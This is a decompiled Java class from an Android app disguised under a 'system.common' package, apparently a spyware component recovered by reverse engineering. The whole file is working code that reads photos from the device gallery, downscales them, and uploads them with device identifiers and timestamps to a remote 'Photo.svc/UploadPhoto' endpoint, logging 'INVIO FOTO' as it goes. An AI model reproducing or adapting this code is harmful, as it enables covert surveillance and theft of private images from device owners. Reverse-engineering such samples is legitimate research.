package com.app.system.common.d.a;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.BitmapFactory;
import android.graphics.BitmapFactory.Options;
import android.net.Uri;
import android.provider.MediaStore.Images.Media;
import com.app.system.common.entity.PhotoLog;
import com.app.system.common.h;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.util.Date;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class l
  extends a
{
  public l(String paramString1, String paramString2)
  {
    super(paramString1, paramString2);
  }
  
  public int a(Context paramContext, PhotoLog paramPhotoLog)
  {
    try
    {
      Object localObject1 = paramContext.getContentResolver();
      Object localObject2 = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
      Object localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      ((StringBuilder)localObject3).append("_id=");
      ((StringBuilder)localObject3).append(paramPhotoLog.b());
      localObject3 = ((ContentResolver)localObject1).query((Uri)localObject2, null, ((StringBuilder)localObject3).toString(), null, null);
      if (!((Cursor)localObject3).moveToNext()) {
        return 0;
      }
      localObject3 = ((Cursor)localObject3).getString(((Cursor)localObject3).getColumnIndexOrThrow("_data"));
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      ((StringBuilder)localObject1).append("photo file path: ");
      ((StringBuilder)localObject1).append((String)localObject3);
      com.security.d.a.d("DBPhoto", ((StringBuilder)localObject1).toString(), new Object[0]);
      localObject1 = new android/graphics/BitmapFactory$Options;
      ((BitmapFactory.Options)localObject1).<init>();
      ((BitmapFactory.Options)localObject1).inSampleSize = 2;
      localObject1 = BitmapFactory.decodeFile((String)localObject3, (BitmapFactory.Options)localObject1);
      localObject3 = null;
      if (localObject1 != null)
      {
        localObject3 = new java/io/ByteArrayOutputStream;
        ((ByteArrayOutputStream)localObject3).<init>();
        int i = ((Bitmap)localObject1).getWidth();
        double d1 = i;
        Double.isNaN(d1);
        i = ((Bitmap)localObject1).getHeight();
        double d2 = i;
        Double.isNaN(d2);
        i = (int)(300.0D / (d1 * 1.0D / d2));
        localObject2 = Bitmap.createScaledBitmap((Bitmap)localObject1, 300, i, true);
        ((Bitmap)localObject2).compress(Bitmap.CompressFormat.PNG, 100, (OutputStream)localObject3);
        ((Bitmap)localObject2).recycle();
        ((Bitmap)localObject1).recycle();
      }
      if (localObject3 == null) {
        return 0;
      }
      localObject3 = ((ByteArrayOutputStream)localObject3).toByteArray();
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      ((StringBuilder)localObject1).append("image size: ");
      ((StringBuilder)localObject1).append(localObject3.length);
      com.security.d.a.d("DBPhoto", ((StringBuilder)localObject1).toString(), new Object[0]);
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      ((StringBuilder)localObject1).append("INVIO FOTO ");
      ((StringBuilder)localObject1).append(paramPhotoLog.c());
      h.a(paramContext, ((StringBuilder)localObject1).toString());
      if (this.b)
      {
        localObject1 = new java/lang/StringBuilder;
        ((StringBuilder)localObject1).<init>();
        ((StringBuilder)localObject1).append(this.c);
        ((StringBuilder)localObject1).append("/Photo.svc");
        ((StringBuilder)localObject1).append("/UploadPhoto");
        ((StringBuilder)localObject1).append("/");
        ((StringBuilder)localObject1).append(this.a);
        ((StringBuilder)localObject1).append("/");
        ((StringBuilder)localObject1).append(paramPhotoLog.c());
        ((StringBuilder)localObject1).append("/");
        ((StringBuilder)localObject1).append(paramPhotoLog.a().getTime() / 1000L);
        ((StringBuilder)localObject1).append("/");
        paramContext = new java/util/Date;
        paramContext.<init>();
        ((StringBuilder)localObject1).append(paramContext.getTimezoneOffset());
        ((StringBuilder)localObject1).append("/");
        ((StringBuilder)localObject1).append(paramPhotoLog.d());
        paramContext = com.app.system.common.d.a.a.a.a(((StringBuilder)localObject1).toString(), paramPhotoLog.c(), (byte[])localObject3);
      }
      else
      {
        paramContext = new java/lang/StringBuilder;
        paramContext.<init>();
        paramContext.append(this.c);
        paramContext.append("/Photo.svc");
        paramContext.append("/UploadPhoto");
        paramContext.append("/");
        paramContext.append(this.a);
        paramContext.append("/");
        paramContext.append(paramPhotoLog.c());
        paramContext.append("/");
        paramContext.append(paramPhotoLog.a().getTime() / 1000L);
        paramContext.append("/");
        localObject1 = new java/util/Date;
        ((Date)localObject1).<init>();
        paramContext.append(((Date)localObject1).getTimezoneOffset());
        paramContext.append("/");
        paramContext.append(paramPhotoLog.d());
        paramContext = com.app.system.common.d.a.a.a.a(paramContext.toString(), paramPhotoLog.c(), (byte[])localObject3);
      }
      if ((paramContext != null) && (!paramContext.equals("")))
      {
        paramPhotoLog = paramContext.body().string();
        localObject3 = new java/lang/StringBuilder;
        ((StringBuilder)localObject3).<init>();
        ((StringBuilder)localObject3).append("SendPhoto Result: ");
        ((StringBuilder)localObject3).append(paramContext);
        com.security.d.a.d("DBPhoto", ((StringBuilder)localObject3).toString(), new Object[0]);
        boolean bool = paramPhotoLog.startsWith("0");
        if (bool) {
          return 0;
        }
        return -20;
      }
      return -10;
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("DBPhoto", paramContext.getMessage(), new Object[0]);
    }
    return 0;
  }
}


/* Location:              ~/com/app/system/common/d/a/l.class
 *
 * Reversed by:           J
 */